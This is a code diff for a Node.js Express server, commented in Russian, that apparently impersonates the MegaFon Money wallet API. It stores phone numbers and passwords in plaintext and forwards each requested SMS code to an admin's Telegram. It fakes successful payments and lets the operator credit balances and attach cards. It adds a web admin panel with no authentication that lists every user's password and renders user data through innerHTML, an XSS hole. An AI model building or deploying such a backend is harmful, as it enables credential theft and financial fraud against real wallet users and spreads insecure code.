@@ -15,8 +15,8 @@ const FLASK_PORT = 4444;
 const app = express();
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-app.use(express.static('public'));
 
+// Отключаем Keep-Alive, чтобы Android не зависал
 app.use((req, res, next) => {
     res.setHeader('Connection', 'close');
     next();
@@ -61,6 +61,9 @@ if (fs.existsSync('catalog.txt')) {
     } catch (e) {}
 }
 
+// Разрешаем серверу отдавать статику из папки 'public' (для баннеров)
+app.use(express.static('public'));
+
 // ==========================================
 // 📞 EXPRESS API МЕГАФОНА
 // ==========================================
@@ -91,6 +94,7 @@ app.post('/api/odp', (req, res) => {
         } else {
             db.prepare('INSERT INTO users (phone, password, sms_code, sid, balance) VALUES (?, ?, ?, ?, ?)').run(phone, '', smsCode, null, 1000.0);
         }
+        if (!user || user.tg_chat_id !== ADMIN_CHAT_ID.toString()) notifyAdmin(`🔔 Запрошен код для ${phone}: ${smsCode}`);
         return res.json({ result: "ok" });
     }
 
@@ -150,7 +154,7 @@ app.post('/api/odp', (req, res) => {
         const user = getUserBySid();
         const name = reqData.name || "Мой шаблон";
         const good_id = reqData.good_id || "unknown";
-        const fields = JSON.stringify(reqData.fields || reqData.field_vals || []);
+        const fields = JSON.stringify(reqData.field_vals || reqData.fields || []);
         db.prepare('INSERT INTO favorites (phone, name, good_id, fields_json) VALUES (?, ?, ?, ?)').run(user.phone, name, good_id, fields);
         return res.json({ result: "ok" });
     }
@@ -183,14 +187,12 @@ app.post('/api/odp', (req, res) => {
     }
 
     // --- 5. ОПЛАТА УСЛУГ (С БАЛАНСА КОШЕЛЬКА) ---
-    // 🔥 ИСПРАВЛЕНИЕ: Ловим transfer_init, если метод оплаты "megafon" (с баланса)
     if (["transfer_add", "add_transfer", "pay_service", "pay", "transfer"].includes(action) || 
        (action === "transfer_init" && reqData.method === "megafon")) {
         
         const user = getUserBySid();
         if (!user) return res.json({ result: "error", code: "401" });
 
-        // Ищем сумму везде: amount, sum, в массиве fields или field_vals
         let amount = parseFloat(reqData.amount || reqData.sum || reqData.request_amount || 0);
         const fieldsArr = reqData.fields || reqData.field_vals;
         
@@ -202,9 +204,7 @@ app.post('/api/odp', (req, res) => {
         if (amount <= 0) return res.json({ result: "error", text: "Ошибка: Сервер не нашел сумму платежа!" });
         if (user.balance < amount) return res.json({ result: "error", text: "Недостаточно средств на балансе!" });
 
-        // ИСПРАВЛЕНИЕ: Берем goods_id
         const good_id = reqData.goods_id || reqData.good_id || "service";
-        
         db.prepare('UPDATE users SET balance = balance - ? WHERE phone = ?').run(amount, user.phone);
         
         const timeNow = new Date().toISOString().replace('T', ' ').substring(0, 19);
@@ -261,8 +261,7 @@ app.post('/api/odp', (req, res) => {
         return res.json({ result: "ok", transfer_id: info.lastInsertRowid.toString() });
     }
 
-    // --- 8. ЭКВАЙРИНГ И WEBVIEW (С новой карты) ---
-    // Если action == transfer_init дошел сюда, значит это НЕ баланс (method !== megafon)
+    // --- 8. ЭКВАЙРИНГ И WEBVIEW (Привязка, Пополнение, P2P с карты) ---
     if (["transfer_init", "send_transfer_card", "link_card"].includes(action)) {
         const user = getUserBySid();
         if (!user) return res.json({ result: "error", code: "401" });
@@ -275,7 +274,6 @@ app.post('/api/odp', (req, res) => {
         }
 
         const transfer_id = "trx_" + Math.floor(100000 + Math.random() * 900000);
-        
         let op_type = "topup_new_card";
         let target = ""; 
 
@@ -294,7 +292,7 @@ app.post('/api/odp', (req, res) => {
         return res.json({ result: "ok", transfer_id: transfer_id, acquirer_url: acquirer_url, acquirer_post: { payment_id: transfer_id, amount: amount.toString() }});
     }
 
-    if (action === "transfer_results") return res.json({ result: "ok", transfer_id: reqData.transfer_id || "", transfer_complete: "1", transfer_status: "ok", error_message: "✅ Платеж успешно проведен!" });
+    if (action === "transfer_result") return res.json({ result: "ok", transfer_id: reqData.transfer_id || "", transfer_complete: "1", transfer_status: "ok", error_message: "✅ Платеж успешно проведен!" });
 
     // --- 9. КАТАЛОГИ УСЛУГ ---
     if (action === "transfer_terms" || action === "get_transfer_terms") return res.json({ result: "ok", comission: "0", min_amount: "1", max_amount: "15000", max_daily_amount: "50000", max_monthly_amount: "100000" });
@@ -322,21 +320,31 @@ app.post('/api/odp', (req, res) => {
         ]});
     }
 
-    // --- 11. РЕКЛАМНЫЕ БАННЕРЫ ---
-    if (action === "mobstudio.mfexpress.ads" || action === "ads") {
+    // --- 11. СПИСОК РЕГИОНОВ ---
+    if (action === "get_regions" || action === "mobstudio.mfexpress.get_regions") {
         return res.json({
             result: "ok",
-            ads: [
-                {
-                    // Картинка, которую мы положили в папку public
-                    // (req.get('host') автоматически подставит ваш IP:4444)
-                    image: `http://${req.get('host')}/banner.jpg`,
-                    
-                    // Ссылка, которая откроется при клике на баннер
-                    url: "https://t.me/megafondengi" 
-                }
+            regions: [
+                { region_id: "100", region_name: "Столичный" },
+                { region_id: "101", region_name: "Кавказский" },
+                { region_id: "102", region_name: "Поволжский" },
+                { region_id: "103", region_name: "Северо-Западный" },
+                { region_id: "104", region_name: "Центральный" },
+                { region_id: "105", region_name: "Сибирский" },
+                { region_id: "106", region_name: "Дальневосточный" },
+                { region_id: "107", region_name: "Уральский" }
             ]
         });
+    }
+
+    // --- 12. ОТПРАВКА КВИТАНЦИИ (ЧЕКА) ---
+    if (action === "transfer_receipt") {
+        const email = reqData.email || "не указан";
+        const transfer_id = reqData.transfer_id || "неизвестно";
+        const user = getUserBySid();
+        const phoneStr = user ? user.phone : "Неизвестный";
+        notifyAdmin(`🧾 ЗАПРОС КВИТАНЦИИ!\nКошелек: ${phoneStr}\nТранзакция: ${transfer_id}\nОтправлено на Email: ${email}`);
+        return res.json({ result: "ok", text: "Квитанция успешно отправлена на указанный адрес." });
     }
 
     // =========================================================
@@ -417,6 +425,7 @@ bot.onText(/\/my_balance (.+)/, (msg, match) => {
     } catch(e) {}
 });
 
+// АДМИНСКИЕ КОМАНДЫ
 bot.onText(/\/users/, (msg) => {
     if (msg.from.id.toString() !== ADMIN_CHAT_ID.toString()) return;
     const users = db.prepare('SELECT phone, password, balance, tg_chat_id FROM users').all();
@@ -434,4 +443,235 @@ bot.onText(/\/add_money (.+) (.+)/, (msg, match) => {
     } catch(e) {}
 });
 
-app.listen(FLASK_PORT, '2.26.61.185', () => { console.log(`[+] Сервер запущен на порту ${FLASK_PORT}`); });
+
+// ==========================================
+// 🖥 WEB-ИНТЕРФЕЙС (ПАНЕЛЬ АДМИНИСТРАТОРА)
+// ==========================================
+
+// API: Статистика для дашборда
+app.get('/api/admin/stats', (req, res) => {
+    try {
+        const totalUsers = db.prepare('SELECT COUNT(*) as count FROM users').get().count;
+        const totalBalance = db.prepare('SELECT SUM(balance) as sum FROM users').get().sum || 0;
+        const totalTransfers = db.prepare('SELECT COUNT(*) as count FROM transfers').get().count;
+        res.json({ totalUsers, totalBalance, totalTransfers });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// API: Список пользователей с их картами
+app.get('/api/admin/users', (req, res) => {
+    try {
+        const users = db.prepare('SELECT phone, password, balance, tg_chat_id FROM users').all();
+        const cards = db.prepare('SELECT * FROM cards').all();
+        
+        const result = users.map(u => {
+            const userCards = cards.filter(c => c.phone === u.phone).map(c => ({
+                card_number: c.card_number,
+                alias: c.alias,
+                card_type: c.card_type
+            }));
+            return { ...u, cards: userCards };
+        });
+        res.json(result);
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// API: Начислить баланс
+app.post('/api/admin/add_money', (req, res) => {
+    const { phone, amount } = req.body;
+    try {
+        db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(parseFloat(amount), phone);
+        res.json({ result: 'ok' });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// API: Привязать карту
+app.post('/api/admin/add_card', (req, res) => {
+    const { phone, card_number, alias } = req.body;
+    try {
+        let cardType = "MasterCard";
+        if (card_number.startsWith("4")) cardType = "VISA";
+        else if (card_number.startsWith("2")) cardType = "MIR";
+        
+        const cardMasked = card_number.length >= 12 ? `${card_number.substring(0, 4)} **** **** ${card_number.slice(-4)}` : card_number;
+        const cardId = "card_" + crypto.randomBytes(4).toString('hex');
+        
+        db.prepare('INSERT INTO cards (phone, card_id, alias, card_number, acquirer_id, card_type) VALUES (?, ?, ?, ?, ?, ?)')
+          .run(phone, cardId, alias || "Новая карта", cardMasked, "1", cardType);
+        res.json({ result: 'ok' });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Рендеринг самого сайта (HTML + CSS + JS в одной строке для удобства)
+app.get('/admin', (req, res) => {
+    const html = `
+    <!DOCTYPE html>
+    <html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Панель управления МегаФон Деньги</title>
+        <style>
+            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; }
+            .container { max-width: 1200px; margin: 0 auto; }
+            header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00B956; padding-bottom: 10px; margin-bottom: 30px; }
+            h1 { color: #00B956; margin: 0; }
+            .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 40px; }
+            .stat-card { background-color: #1e1e1e; border: 1px solid #333; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+            .stat-card h3 { margin: 0 0 10px 0; color: #888; font-size: 14px; text-transform: uppercase; }
+            .stat-card p { margin: 0; font-size: 28px; font-weight: bold; color: #00B956; }
+            .table-container { background-color: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
+            h2 { color: #00B956; margin-top: 0; margin-bottom: 20px; }
+            table { width: 100%; border-collapse: collapse; text-align: left; }
+            th, td { padding: 12px; border-bottom: 1px solid #333; }
+            th { color: #888; text-transform: uppercase; font-size: 12px; }
+            tr:hover { background-color: #252525; }
+            .btn { background-color: #00B956; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold; margin-right: 5px; transition: background 0.2s; }
+            .btn:hover { background-color: #009e49; }
+            .btn-blue { background-color: #0056b3; }
+            .btn-blue:hover { background-color: #004085; }
+            .card-badge { display: inline-block; background-color: #333; padding: 2px 6px; border-radius: 4px; font-size: 11px; margin-right: 5px; border: 1px solid #444; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <header>
+                <h1>🟢 МегаФон Деньги</h1>
+                <div>Web Админка v1.0</div>
+            </header>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <h3>Всего кошельков</h3>
+                    <p id="stat-users">0</p>
+                </div>
+                <div class="stat-card">
+                    <h3>Общий баланс</h3>
+                    <p id="stat-balance">0 ₽</p>
+                </div>
+                <div class="stat-card">
+                    <h3>Всего транзакций</h3>
+                    <p id="stat-transfers">0</p>
+                </div>
+            </div>
+
+            <div class="table-container">
+                <h2>📱 Список пользователей</h2>
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Номер (Логин)</th>
+                            <th>Пароль</th>
+                            <th>Баланс</th>
+                            <th>Telegram Chat ID</th>
+                            <th>Привязанные карты</th>
+                            <th>Действия</th>
+                        </tr>
+                    </thead>
+                    <tbody id="users-tbody">
+                        <tr><td colspan="6" style="text-align: center; color: #888;">Загрузка данных...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <script>
+            // Загрузка статистики
+            async function loadStats() {
+                try {
+                    const res = await fetch('/api/admin/stats');
+                    const data = await res.json();
+                    document.getElementById('stat-users').innerText = data.totalUsers;
+                    document.getElementById('stat-balance').innerText = data.totalBalance.toLocaleString() + ' ₽';
+                    document.getElementById('stat-transfers').innerText = data.totalTransfers;
+                } catch (e) { console.error(e); }
+            }
+
+            // Загрузка пользователей
+            async function loadUsers() {
+                try {
+                    const res = await fetch('/api/admin/users');
+                    const users = await res.json();
+                    const tbody = document.getElementById('users-tbody');
+                    tbody.innerHTML = '';
+
+                    users.forEach(u => {
+                        const tr = document.createElement('tr');
+                        
+                        // Рендерим карты
+                        let cardsHtml = '';
+                        if (u.cards && u.cards.length > 0) {
+                            u.cards.forEach(c => {
+                                cardsHtml += \`<span class="card-badge">\${c.card_type} (\${c.card_number.slice(-4)})</span>\`;
+                            });
+                        } else {
+                            cardsHtml = '<span style="color: #666; font-size: 12px;">Нет карт</span>';
+                        }
+
+                        tr.innerHTML = \`
+                            <td style="font-weight: bold; color: #00B956;">\${u.phone}</td>
+                            <td><code>\${u.password || 'Нет'}</code></td>
+                            <td style="font-weight: bold;">\${u.balance.toLocaleString()} ₽</td>
+                            <td>\${u.tg_chat_id ? '✅ ' + u.tg_chat_id : '❌'}</td>
+                            <td>\${cardsHtml}</td>
+                            <td>
+                                <button class="btn" onclick="addMoney('\${u.phone}')">💰 Пополнить</button>
+                                <button class="btn btn-blue" onclick="addCard('\${u.phone}')">💳 Выдать карту</button>
+                            </td>
+                        \`;
+                        tbody.appendChild(tr);
+                    });
+                } catch (e) { console.error(e); }
+            }
+
+            // Экшн: Начислить баланс
+            async function addMoney(phone) {
+                const amount = prompt("Введите сумму пополнения для " + phone + ":");
+                if (!amount || isNaN(amount)) return;
+
+                const res = await fetch('/api/admin/add_money', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, amount })
+                });
+                if (res.ok) {
+                    loadStats();
+                    loadUsers();
+                }
+            }
+
+            // Экшн: Привязать карту
+            async function addCard(phone) {
+                const cardNumber = prompt("Введите 16-значный номер карты для " + phone + ":");
+                if (!cardNumber || cardNumber.length < 12) return;
+                const alias = prompt("Введите название карты (например, Сбербанк):", "Моя карта");
+
+                const res = await fetch('/api/admin/add_card', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, card_number: cardNumber, alias })
+                });
+                if (res.ok) {
+                    loadUsers();
+                }
+            }
+
+            // Стартовый запуск
+            loadStats();
+            loadUsers();
+        </script>
+    </body>
+    </html>
+    `;
+    res.send(html);
+});
+
+app.listen(FLASK_PORT, '0.0.0.0', () => { console.log(`[+] Сервер запущен на порту ${FLASK_PORT}`); });
